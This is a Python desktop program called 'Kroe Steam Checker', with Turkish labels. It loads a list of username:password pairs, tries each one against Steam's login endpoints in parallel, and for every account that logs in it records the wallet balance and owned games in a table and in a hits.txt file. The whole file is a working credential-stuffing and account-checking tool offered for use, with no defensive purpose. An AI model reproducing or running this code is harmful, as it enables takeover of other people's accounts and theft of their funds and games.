import customtkinter as ctk
import threading, requests, random, base64, re, json, tkinter as tk
from tkinter import filedialog, ttk
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from concurrent.futures import ThreadPoolExecutor

ctk.set_appearance_mode("Dark")

class KroeSteamChecker(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Kroe Steam Checker")
        self.geometry("1100x750")
        self.stop_event = threading.Event()
        self.filepath = ""

        # Arka Plan Canvas (Dinamik Etkiler)
        self.canvas = tk.Canvas(self, bg="#0d1117", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        # İmleç izi için liste
        self.dots = []
        self.bind('<Motion>', self.draw_trail)

        # Şık Arayüz Frame'i
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.9, relheight=0.9)

        self.header = ctk.CTkLabel(self.main_frame, text="KROE STEAM CHECKER WITH CAPTURE", font=("Segoe UI", 32, "bold"), text_color="#1f538d")
        self.header.pack(pady=20)

        self.btn_select = ctk.CTkButton(self.main_frame, text="HESAP DOSYASINI SEÇ", command=self.load_file, fg_color="#1f538d", hover_color="#2c67ad")
        self.btn_select.pack(pady=10, padx=20, fill="x")

        # Butonlar
        self.btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.btn_frame.pack(pady=10)
        self.btn_start = ctk.CTkButton(self.btn_frame, text="BAŞLAT", command=self.start_thread, fg_color="green", hover_color="#006400")
        self.btn_start.pack(side="left", padx=5)
        self.btn_stop = ctk.CTkButton(self.btn_frame, text="DURDUR", command=self.stop_engine, fg_color="red", hover_color="#8b0000")
        self.btn_stop.pack(side="left", padx=5)

        # Treeview
        self.tree = ttk.Treeview(self.main_frame, columns=("User", "Pass", "Balance", "Games"), show='headings')
        self.tree.pack(fill="both", expand=True, padx=20, pady=10)
        for col in ("User", "Pass", "Balance", "Games"): self.tree.heading(col, text=col.upper())

    # İZ BIRAKMA EFEKTİ
    def draw_trail(self, event):
        dot = self.canvas.create_oval(event.x-2, event.y-2, event.x+2, event.y+2, fill="#1f538d", outline="")
        self.dots.append(dot)
        if len(self.dots) > 15:
            self.canvas.delete(self.dots.pop(0))
        self.after(50, lambda d=dot: self.canvas.delete(d))

    def load_file(self):
        self.filepath = filedialog.askopenfilename()
        if self.filepath: self.header.configure(text=f"OPERASYONEL HAZIR: {self.filepath.split('/')[-1]}")

    def start_thread(self):
        if not self.filepath: return
        self.stop_event.clear()
        threading.Thread(target=self.run_engine, daemon=True).start()
        self.btn_start.configure(state="disabled")

    def stop_engine(self):
        self.stop_event.set()
        self.btn_start.configure(state="normal")

    def run_engine(self):
        with open(self.filepath, 'r') as f: combos = f.read().splitlines()
        with ThreadPoolExecutor(max_workers=5) as executor:
            for combo in combos:
                if self.stop_event.is_set(): break
                executor.submit(self.check_api, combo)
        self.after(0, lambda: self.btn_start.configure(state="normal"))

    def check_api(self, combo):
        try:
            user, password = combo.split(":")
            session = requests.Session()
            session.headers.update({"User-Agent": "Mozilla/5.0"})
            
            # Login
            key_res = session.get(f"https://steamcommunity.com/login/getrsakey/?username={user}").json()
            key = RSA.construct((int(key_res['publickey_mod'], 16), int(key_res['publickey_exp'], 16)))
            enc_pass = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
            data = {"username": user, "password": enc_pass, "rsatimestamp": key_res['timestamp'], "oauth_client_id": "DE45CD61"}
            res = session.post("https://steamcommunity.com/login/dologin/", data=data)

            if "success" in res.text:
                # Capture Bakiye & Oyun
                acc_res = session.get("https://store.steampowered.com/account/")
                bal = re.search(r'data-wallet-balance="([^"]+)"', acc_res.text)
                bal = bal.group(1).strip() if bal else "0.00"

                game_res = session.get(f"https://steamcommunity.com/id/{user}/games/?xml=1")
                games = re.findall(r'<name><!\[CDATA\[(.*?)\]\]></name>', game_res.text)
                games_str = f"{len(games)} ({', '.join(games[:3])})"

                self.after(0, lambda: self.tree.insert("", "end", values=(user, password, bal, games_str)))
                with open("hits.txt", "a") as f: f.write(f"{user}:{password} | Bal: {bal} | Games: {games_str}\n")
        except: pass

if __name__ == "__main__":
    app = KroeSteamChecker()
    app.mainloop()